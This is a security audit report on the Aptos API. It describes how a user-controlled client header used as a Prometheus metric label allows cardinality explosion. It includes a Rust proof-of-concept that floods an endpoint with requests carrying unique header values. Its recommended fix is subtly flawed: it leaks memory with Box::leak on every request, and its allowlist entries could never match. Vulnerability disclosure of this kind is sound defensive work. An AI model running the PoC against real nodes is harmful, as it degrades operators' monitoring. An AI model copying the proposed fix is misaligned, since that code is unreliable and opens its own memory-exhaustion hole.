# Audit Report

## Title
Unbounded Cardinality in API Request Metrics via User-Controlled HTTP Header

## Summary
The Aptos API service extracts the `X_APTOS_CLIENT` HTTP header value and uses it directly as a Prometheus metric label after minimal regex validation. An attacker can send requests with arbitrarily many different header values matching the regex pattern, causing metric cardinality explosion that exhausts memory and degrades performance in monitoring systems like Prometheus.

## Finding Description

The vulnerability exists in the API request logging middleware. When handling HTTP requests, the code extracts the `X_APTOS_CLIENT` header and uses it as a label for the `REQUEST_SOURCE_CLIENT` metric. [1](#0-0) 

The `determine_request_source_client` function validates the header format using a regex but does not limit cardinality: [2](#0-1) 

The regex pattern `aptos-[a-zA-Z\-]+/[0-9A-Za-z\.\-]+` allows countless unique values like:
- `aptos-attacker-aaa/1.0.0`
- `aptos-attacker-aab/1.0.0`
- `aptos-attacker-aac/1.0.0`
- ... (millions of combinations)

The metric definition accepts these unbounded labels: [3](#0-2) 

**Attack Flow:**
1. Attacker sends HTTP requests to any API endpoint
2. Each request includes a unique `X_APTOS_CLIENT` header matching the regex
3. Each unique value creates a new time series in Prometheus
4. After millions of requests, the monitoring system runs out of memory or becomes unresponsive
5. Loss of observability masks other attacks

The codebase shows awareness of cardinality concerns, warning when metric families exceed 2000 dimensions: [4](#0-3) 

However, no such protection exists for the API request source labels.

## Impact Explanation

This issue causes **monitoring system degradation**, which is classified as **Medium severity** in the security question context. The impact includes:

1. **Memory Exhaustion**: Prometheus stores each unique label combination as a separate time series, consuming memory proportionally to cardinality
2. **Query Performance Degradation**: High cardinality makes dashboard queries slow or timeout
3. **Monitoring System Crash**: Extreme cardinality can cause OOM kills of Prometheus pods
4. **Loss of Observability**: Operators lose visibility into system health, masking other attacks

While this doesn't directly break blockchain consensus or cause fund loss, it degrades critical operational infrastructure that validators and node operators rely on to detect anomalies and attacks.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- No authentication required for public API endpoints
- No rate limiting on unique header values
- Automated scripts can generate millions of unique headers
- Attack works from any internet-connected client

The only protection is the regex validation, which still permits unbounded cardinality within its format constraints.

## Recommendation

Implement cardinality limiting for user-controlled metric labels:

```rust
// In api/src/log.rs, modify determine_request_source_client:

use std::collections::HashSet;
use once_cell::sync::Lazy;
use parking_lot::RwLock;

// Maintain a set of known client identifiers
static KNOWN_CLIENTS: Lazy<RwLock<HashSet<String>>> = Lazy::new(|| {
    RwLock::new(HashSet::from([
        "aptos-sdk-rust".to_string(),
        "aptos-sdk-python".to_string(),
        "aptos-sdk-typescript".to_string(),
        // ... other known SDKs
    ]))
});

const MAX_UNIQUE_CLIENTS: usize = 100;

fn determine_request_source_client(aptos_client: &Option<String>) -> &'static str {
    let aptos_client = match aptos_client {
        Some(aptos_client) => aptos_client,
        None => return REQUEST_SOURCE_CLIENT_UNKNOWN,
    };

    match REQUEST_SOURCE_CLIENT_REGEX.find_iter(aptos_client).last() {
        Some(capture) => {
            let client_str = capture.as_str();
            
            // Check if it's a known client
            {
                let known = KNOWN_CLIENTS.read();
                if known.contains(client_str) {
                    // Leak the string to return &'static str
                    return Box::leak(client_str.to_string().into_boxed_str());
                }
            }
            
            // Check if we can add a new client
            {
                let mut known = KNOWN_CLIENTS.write();
                if known.len() < MAX_UNIQUE_CLIENTS {
                    known.insert(client_str.to_string());
                    return Box::leak(client_str.to_string().into_boxed_str());
                }
            }
            
            // Too many unique clients - return "other"
            "other"
        },
        None => REQUEST_SOURCE_CLIENT_UNKNOWN,
    }
}
```

Alternatively, use a pre-defined allowlist and label all others as "unknown" or "other".

## Proof of Concept

```rust
// PoC: HTTP client script to trigger cardinality explosion

use reqwest::Client;
use std::time::Duration;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let api_url = "http://localhost:8080/v1/accounts/0x1"; // Any API endpoint
    
    // Send requests with unique X_APTOS_CLIENT headers
    for i in 0..10000 {
        let header_value = format!("aptos-attacker-{:06}/1.0.0", i);
        
        let response = client
            .get(api_url)
            .header("X-Aptos-Client", header_value)
            .timeout(Duration::from_secs(5))
            .send()
            .await?;
        
        if i % 100 == 0 {
            println!("Sent {} requests, status: {}", i, response.status());
        }
    }
    
    println!("Attack complete. Check Prometheus cardinality for REQUEST_SOURCE_CLIENT metric.");
    
    // Query to check cardinality:
    // count(count by (request_source_client) (aptos_api_request_source_client))
    
    Ok(())
}
```

Run this script and observe:
1. Prometheus metric cardinality increases linearly
2. Memory usage grows in Prometheus pod
3. Dashboard query latency increases
4. Eventually, Prometheus may OOM or become unresponsive

## Notes

The codebase already monitors for high-cardinality metrics (>2000 dimensions) in the inspection service, indicating awareness of this class of issue. However, the API layer lacks similar protections for user-controlled labels. This vulnerability represents an operational security gap rather than a direct blockchain protocol vulnerability.

### Citations

**File:** api/src/log.rs (L123-130)
```rust
    // Push a counter based on the request source, sliced up by endpoint + method.
    REQUEST_SOURCE_CLIENT
        .with_label_values(&[
            determine_request_source_client(&log.aptos_client),
            operation_id,
            log.status.to_string().as_str(),
        ])
        .inc();
```

**File:** api/src/log.rs (L148-162)
```rust
fn determine_request_source_client(aptos_client: &Option<String>) -> &str {
    // If the header is not set we can't determine the request source.
    let aptos_client = match aptos_client {
        Some(aptos_client) => aptos_client,
        None => return REQUEST_SOURCE_CLIENT_UNKNOWN,
    };

    // If there were no matches, we can't determine the request source. If there are
    // multiple matches for some reason, instead of logging nothing, we use whatever
    // value we matched on last.
    match REQUEST_SOURCE_CLIENT_REGEX.find_iter(aptos_client).last() {
        Some(capture) => capture.as_str(),
        None => REQUEST_SOURCE_CLIENT_UNKNOWN,
    }
}
```

**File:** api/src/metrics.rs (L61-68)
```rust
pub static REQUEST_SOURCE_CLIENT: Lazy<IntCounterVec> = Lazy::new(|| {
    register_int_counter_vec!(
        "aptos_api_request_source_client",
        "API requests grouped by source (e.g. which SDK, unknown, etc), operation_id, and status",
        &["request_source_client", "operation_id", "status"]
    )
    .unwrap()
});
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L56-69)
```rust
    for metric_family in &metric_families {
        let family_count = metric_family.get_metric().len();
        if family_count > 2000 {
            families_over_2000 = families_over_2000.saturating_add(1);
            let name = metric_family.get_name();
            warn!(
                count = family_count,
                metric_family = name,
                "Metric Family '{}' over 2000 dimensions '{}'",
                name,
                family_count
            );
        }
        total = total.saturating_add(family_count as u64);
```
